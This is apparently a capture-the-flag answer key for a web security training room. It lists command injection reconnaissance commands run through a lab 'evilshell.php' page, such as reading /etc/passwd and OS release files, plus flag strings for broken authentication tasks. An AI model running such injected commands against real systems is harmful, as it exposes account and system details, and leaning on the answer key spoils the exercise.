# SEVERITY #1 - Injection

## [Severity 1] Command Injection Practical

First, go to the link http://machine_ip/evilshell.php

Q: What strange text file is in the website root directory?
A: drpepper.txt
> Command: ls

Q: How many non-root/non-service/non-daemon users are there?
A: 0
> Command: ls /home

Q: What user is this app running as?
A: www-data
> Command: whoami

Q: What is the user's shell set as?
A: /usr/sbin/nologin 
> Command: cat /etc/passwd | grep www-data

Q: What version of Ubuntu is running?
A: 18.04.4
> Command: cat /etc/*-release

Q: Print out the MOTD.  What favorite beverage is shown?
A: Dr Pepper

```
$ ls /etc/update-motd.d
00-header 10-help-text 50-landscape-sysinfo 50-motd-news 80-esm 80-livepatch 90-updates-available 91-release-upgrade 92-unattended-upgrades 95-hwe-eol 97-overlayroot 98-fsck-at-reboot 98-reboot-required 

$ cat /etc/update-motd.d/00-header
...
<checkout the last line>
...
``` 

# Severity 2 - Broken Authentication

## [Severity 2] Broken Authentication Practical

Q: What is the flag that you found in darren's account?
A: fe86079416a21a3c99937fea8874b667

Q: Now try to do the same trick and see if you can login as arthur.
A: --NO NEED--

Q: What is the flag that you found in arthur's account?
A: d9ac0f7db4fda460ac3edeb75d75e16e